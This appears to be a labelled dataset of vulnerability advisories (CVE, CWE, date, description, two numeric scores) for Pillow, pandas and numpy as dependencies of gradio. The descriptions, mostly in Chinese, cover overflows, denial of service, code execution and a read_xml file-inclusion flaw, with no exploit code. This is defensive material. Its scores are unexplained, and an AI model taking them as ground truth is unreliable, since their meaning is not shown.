NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,Pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
gradio-app_gradio,Pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
gradio-app_gradio,Pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
gradio-app_gradio,Pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
gradio-app_gradio,Pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
gradio-app_gradio,Pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
gradio-app_gradio,Pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
gradio-app_gradio,Pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
gradio-app_gradio,Pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
gradio-app_gradio,Pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
gradio-app_gradio,Pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
gradio-app_gradio,Pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

